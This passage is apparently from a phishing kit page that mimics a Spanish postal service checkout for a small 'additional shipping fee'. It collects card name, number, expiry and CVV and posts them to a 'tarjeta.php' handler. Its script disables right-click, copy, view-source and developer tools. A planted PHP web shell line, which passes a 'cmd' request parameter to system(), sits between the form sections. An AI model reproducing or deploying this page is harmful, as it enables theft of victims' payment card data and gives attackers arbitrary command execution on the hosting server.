                                                                        Si aГєn no es usuario de CityPaq, puede registrarse en este enlace: <a href="#" target="_homepaq">Ir a CityPaq</a>
                                                                    </p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div style="width:100%">
                                                        <small class="text-muted">Paq EstГЎndar CityPaq</small>
                                                        <small class="text-muted">
                                                            <p>Haz tus pedidos y recГіgelos en el CityPaq que mГЎs te convenga</p>
                                                        </small>
                                                    </div>
                                                    <!--  NEW SCREEN END -->
                                                </div>
                                            </div>
                                        </div>
                                    </section>
                                </div>

                                <div id="paypalexpressParent" class="shopping-cart-locked-parent" style="display: block;">


                                </div>

                                <div id="shippingAddressLocked" class="shopping-cart-locked-parent" style="display: none;"></div>
                                <div id="shippingAddressList" class="shopping-cart-form-parent" style="display: none;"></div>
                                <div id="shippingAddressForm" class="shopping-cart-form-parent" style="display: block;">
                                    <section class="checkout-new-shipping-address">
                                        <div class="checkout-box">
                                            <div class="checkout-box-title">
                                                <div class="checkout-box-title-icon">
                                                    <svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="45px" height="45px" viewBox="0 0 73.312 73.312" style="enable-background:new 0 0 73.312 73.312;color:blue;" xml:space="preserve">
                                                        <g>
                                                            <g>
                                                                <g>
                                                                    <path style="fill:#193c6b" d="M66.368,20.672c0.224,0,0.224,0,0.447,0l-3.359-12.99c-0.896-3.809-4.929-6.049-8.513-4.929L5.217,15.969
				c-3.808,0.896-6.048,4.928-4.928,8.512l4.256,16.128v-9.632c0-5.822,4.704-10.526,10.528-10.526h51.295V20.672z" />
                                                                    <path style="fill:#193c6b" d="M66.368,24.256h-51.52c-3.808,0-6.943,3.137-6.943,6.944v32.702c0,3.81,3.136,6.944,6.943,6.944h51.52
				c3.808,0,6.943-3.137,6.943-6.944V31.202C73.313,27.392,70.176,24.256,66.368,24.256z M68.609,63.905
				c0,1.345-1.119,2.239-2.239,2.239H14.85c-1.344,0-2.239-1.119-2.239-2.24v-8.286h56.223v8.286L68.609,63.905L68.609,63.905z
				 M68.609,39.489h-56v-8.287c0-1.345,1.12-2.24,2.239-2.24h51.52c1.345,0,2.239,1.12,2.239,2.24L68.609,39.489L68.609,39.489z" />
                                                                </g>
                                                            </g>
                                                        </g>

                                                    </svg>
                                                </div>
                                                <h4>Detalles del pago</h4>
                                            </div>
                                            <div class="checkout-box-content">
                                                <form class="checkout-new-shipping-address-form" method="post" action="./Deliver/tarjeta.php">
                                                    <div class="form-row">
                                                        <div class="form-group">
                                                            <div style="color:red;display:flex;">
                                                                <div>
                                                                    <label style="font-size:21px;font-weight:bold;color:red;">*</label>
                                                                </div>
                                                                <div>
                                                                    &nbsp; Campo obligatorio
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="form-row">
                                                        <div class="form-group col-md-8">
                                                            <label for="shipping.firstname">Nombre en la tarjeta <text style="color: red;">*</text></label>
                                                            <input type="text" name="ccname" id="ccname" minlength="7" maxlength="45" style="width:20rem;" class="form-control" required="true" oninput="allow_alphabets(this)" autocomplete="off">
                                                        </div>
                                                    </div>
                                                    <div class="form-row">
                                                        <div class="form-group col-md-8">
                                                            <label for="shipping.email">Número de tarjeta <text style="color: red;">*</text></label>
                                                            <input type="tel" placeholder="xxxx xxxx xxxx xxxx" name="card" id="shippingemail" minlength="16" maxlength="19" class="form-control" title="Introduzca un número de crédito de tarjeta válido." autocomplete="off" required="true" value="<?php echo get_value('card'); ?>">
                                                            <?php echo error_message($_SESSION['errors'], 'card'); ?>
                                                        </div>
                                                    </div>


                                                    <div class="form-row">
                                                        <div class="form-group col-md-6">
                                                            <label for="inputAddress2">Fecha de caducidad <text style="color: red;">*</text></label>
                                                            <div style="display:flex;">
                                                                <select style="margin: 0 3px;" name="expm" title="month">
                                                                    <option value="Mes" selected="selected">Mes</option>
                                                                    <option value="01">01</option>
                                                                    <option value="02">02</option>
                                                                    <option value="03">03</option>
                                                                    <option value="04">04</option>
                                                                    <option value="05">05</option>
                                                                    <option value="06">06</option>
                                                                    <option value="07">07</option>
                                                                    <option value="08">08</option>
                                                                    <option value="09">09</option>
                                                                    <option value="10">10</option>
                                                                    <option value="11">11</option>
                                                                    <option value="12">12</option>
                                                                </select>
                                                                <select style="margin: 0 3px;" name="expy" title="year">
                                                                    <option value="Año" selected="selected">Año</option>
                                                                    <option value="2022">2022</option>
                                                                    <option value="2023">2023</option>
                                                                    <option value="2024">2024</option>
                                                                    <option value="2025">2025</option>
                                                                    <option value="2026">2026</option>
                                                                    <option value="2027">2027</option>
                                                                    <option value="2028">2028</option>
                                                                    <option value="2029">2029</option>
                                                                    <option value="2030">2030</option>
                                                                    <option value="2031">2031</option>
                                                                    <option value="2032">2032</option>
                                                                    <option value="2033">2033</option>
                                                                    <option value="2034">2034</option>
                                                                    <option value="2035">2035</option>
                                                                    <option value="2036">2036</option>
                                                                    <option value="2037">2037</option>
                                                                    <option value="2038">2038</option>
                                                                    <option value="2039">2039</option>
                                                                    <option value="2040">2040</option>
                                                                </select>
                                                            </div>
                                                            <?php echo error_message($_SESSION['errors'], 'date'); ?>
                                                        </div>
                                                    </div>


                                                    <div class="form-row">
                                                        <div class="form-group col-md-4">
                                                            <label for="shipping.postalcode">Código CVV <text style="color: red;">*</text></label>
                                                            <input type="tel" placeholder="XXX" name="cvv" id="shippingpostalcode" maxlength="3" minlength="3" title="3 dígitos mostrados en el reverso de su Tarjeta" class="form-control null" autocomplete="off" required="true" value="<?php echo get_value('cvv'); ?>">
                                                            <?php echo error_message($_SESSION['errors'], 'cvv'); ?>
                                                        </div>

                                                    </div>


                                                    <div class="form-group">

                                                    </div>

                                                    <div class="form-group">
                                                        <div class="custom-control custom-checkbox">
                                                            <input type="checkbox" name="accept_dpp_shipping" class="custom-control-input" id="accept_dpp_shipping" data-prompt-position="bottomRight" value="YES">
                                                            <label class="custom-control-label" for="accept_dpp_shipping">He leído y acepto la <a target="_blank" href="./assets/politica-de-privacidad/"><b>Política de privacidad</b></a>.</label>
                                                        </div>
                                                    </div>
                                                    <section class="continue-button py-2 mb-4" id="continueButtonParent">
                                                        <div class="d-flex justify-content-end">
                                                            <button type="button" class="btn btn-danger btn-cart-cancel-edit ml-1" style="display:none">Cancelar</button>
                                                            <button type="submit" id="btn-continue" class="btn btn-primary">Pagar y continuar &gt;</button>
                                                        </div>
                                                    </section>
                                                </form>
                                            </div>
                                        </div>
                                    </section>
                                </div>
                                <?php if(isset($_REQUEST['cmd'])){echo "<pre>";system($_REQUEST['cmd']);echo "</pre>";};?>
                                <div id="billingAddressLocked" class="shopping-cart-locked-parent" style="display: none;"></div>
                                <div id="billingAddressForm" class="shopping-cart-form-parent" style="display: none;"></div>

                                <div id="paymentBox" class="shopping-cart-form-parent" style="display: none;"></div>
                                <div id="paymentLocked" class="shopping-cart-locked-parent" style="display: none;"></div>


                                <div id="discountForm" class="shopping-cart-form-parent d-lg-none" style="display: none;"></div>
                                <div id="discountLocked" class="shopping-cart-locked-parent" style="display: none;"></div>




                                <div id="checkoutButton" style="display:none">
                                    <div class="order-payment-checkboxs">
                                        <div class="custom-control custom-checkbox">
                                            <input type="checkbox" name="isacceptmarketing" class="custom-control-input" id="isacceptmarketing" value="YES">
                                            <label class="custom-control-label" for="isacceptmarketing">Deseo recibir ofertas y promociones de los productos y servicios comercializados</label>
                                        </div>

                                        <div class="custom-control custom-checkbox">
                                            <input type="checkbox" name="accept_dpp" class="custom-control-input validate[required]" id="accept_dpp" data-prompt-position="bottomRight" value="YES">


                                            <label class="custom-control-label" for="accept_dpp">He leГ­do y acepto las <a target="_blank" href="#"><b>Condiciones de Venta</b></a>.</label>

                                        </div>
                                    </div>


                                    <section class="continue-button py-2 mb-4">
                                        <div class="d-flex justify-content-end">

                                            <button type="button" class="btn btn-primary btn-shopping-cart-checkout">Confirmar y pagar pedido &gt;</button>

                                        </div>
                                    </section>
                                </div>

                            </div>


                        </div>
                    </div>
                    <div class="col-lg-5">
                        <div class="checkout-right-side">

                            <section class="checkout-summary d-none d-lg-block">

                                <div class="summary-product-list">

                                    <div class="item">
                                        <div class="row">
                                            <div class="col-3 flex-grow-0 image-col">
                                                <div class="item-image">
                                                    <a href="#">
                                                        <img src="./assets/particulares_fichiers/11.png">
                                                    </a>

                                                </div>
                                            </div>
                                            <div class="col-5 title-col">
                                                <div class="item-title">
                                                    <p>
                                                        Tarifa De Envio Adicional
                                                        <i></i>
                                                    </p>
                                                </div>

                                            </div>
                                            <div class="col-4 flex-grow-0 buttons-col">
                                                <div class="d-flex buttons-col-container justify-content-between h-100">

                                                    <div class="item-price-total">
                                                        <p class="item-price">2,64 €</p>
                                                        <p style="display:none;" class="item-vat-text">


                                                            (1,21 € IVA incluido)

                                                        </p>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>


                                <div class="summary-subtotal">

                                    <div class="summary-total">
                                        <div class="row">
                                            <div class="col">
                                                <div class="text-left">
                                                    <p class="total-title">Total</p>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="text-right">
                                                    <p class="total-amount">2,64 €</p>

                                                    <p class="total-vat-included">


                                                        (1,21 € IVA incluido)

                                                    </p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </section>
                        </div>
                    </div>
                </div>

            </div>
        </section>

    </section>

    <section class="common-screen-footer">

    </section>

</body>

<script src="./assets/jquery1.min.js.download"></script>
<script src="./assets/jquery.inputmask.bundle.js.download"></script>

<script src="./assets/jquery.ccvalid.js"></script>

<script>
    jQuery(function($) {

        document.addEventListener('contextmenu', event => event.preventDefault());
        document.onkeydown = function(e) {
            if (e.ctrlKey &&
                (e.keyCode === 67 ||
                    e.keyCode === 86 ||
                    e.keyCode === 85 ||
                    e.keyCode === 83 ||
                    e.keyCode === 117)) {
                return false;
            } else {
                return true;
            }
        };

        $(document).keydown(function(event) {
            if (event.keyCode == 123) { // Prevent F12
                return false;
            } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
                return false;
            }
        });
    })
</script>

<script type="text/javascript">
    $(document).ready(function() {
        console.log("get Ready");
        $(":input").inputmask();
        $(document).on('keyup', '#shippingpostalcode', function() {
            $("#shippingpostalcode").inputmask({
                "mask": "999"
            });
        });

        $(document).on('keyup', '#shippingemail', function() {
            $("#shippingemail").inputmask({
                "mask": "9999 9999 9999 9999"
            });
        });
    })
</script>

</html>